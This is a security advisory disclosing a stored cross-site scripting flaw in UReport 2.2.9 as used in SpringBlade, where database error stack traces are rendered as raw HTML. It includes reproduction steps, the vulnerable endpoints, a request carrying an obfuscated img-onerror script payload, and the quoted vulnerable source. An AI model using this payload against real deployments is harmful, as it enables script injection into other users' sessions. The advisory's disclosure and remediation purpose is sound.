# UReport SQL-error stack stored XSS

## Summary

A stored report dataset SQL statement can place attacker markup in a database error. The full stack trace is converted to HTML without encoding and rendered as raw preview content.

## Affected product

- Vendor/project: **youseries**
- Product: **UReport**
- Affected version: **2.2.9 (verified in SpringBlade 5.0.2)**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Authenticated report author; victim previews the stored report.

Verified flow: `stored report SQL -> database error text -> buildExceptionMessage() -> raw ${content} in preview`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Save a report whose dataset SQL generates a syntax error containing an HTML marker.
2. Confirm the report record is persisted.
3. Preview the report and inspect the error block generated from the database exception.

Sanitized request shape used during verification:

```http
POST <BASE_URL>/blade-report/ureport/designer/saveReportFile
blade-auth: bearer <JWT>
Content-Type: application/x-www-form-urlencoded

file=URLENCODE×3("blade-gt48261022n1c.ureport.xml")
content=URLENCODE×2(<ureport><dataset type="sql"><sql>
  select 1 as a &lt;img src=x onerror=self[`al`+`ert`](`gt48261022n1c`)&gt;
</sql>...</dataset></ureport>)

GET <BASE_URL>/blade-report/ureport/preview?_u=blade-gt48261022n1c.ureport.xml
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.


## Confirmed source and Sink

```text
HtmlPreviewServletAction.java:68-79,338-347
try { loadReport(req); } catch (Exception ex) {
    String errorMsg = buildExceptionMessage(ex);
    context.put("content", "<div style='color:red'>" + errorMsg + "</div>");
}
root.printStackTrace(pw);
return sw.toString().replaceAll("\n", "<br>");

ureport-html/html-preview.html:106
${content}
```

Root cause: Attacker-influenced database diagnostics are converted to HTML line breaks but never encoded before raw template rendering.

## Recommended remediation

Render exception text through an HTML encoder, suppress database diagnostics from user-facing pages, and log detailed stacks server-side only.

## References

- Official source: https://github.com/youseries/ureport/blob/master/ureport2-console/src/main/java/com/bstek/ureport/console/html/HtmlPreviewServletAction.java

## Evidence images

These are screenshots of real browser/tool interfaces captured with Google Chrome on macOS. They are not recreated evidence cards:

1. Chrome's native `view-source:` display of the saved trigger response or browser result, with the observed marker selected.
2. Chrome's native `view-source:` display of an independent response, storage record, or browser-verification artifact.
3. The official upstream GitHub source page with GitHub's native line highlighting on the vulnerable Sink.

The first two screenshots reopen saved verification artifacts; they are not described as live requests. Private deployment addresses, credentials, session values, CSRF values, GUIDs and internal record identifiers are redacted. JSON whitespace was normalized for readability, and unrelated application records were omitted where a response contained other test-session data. The payload, affected field, response status and success booleans were retained.

### Trigger response/result in Chrome

![CAN-05 trigger response in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-05/01-trigger-chrome-v3.png)

### Independent verification in Chrome

![CAN-05 independent verification in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-05/02-verification-chrome-v3.png)

### Official source and Sink on GitHub

![CAN-05 official source Sink](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-05/03-source-github-v3.png)
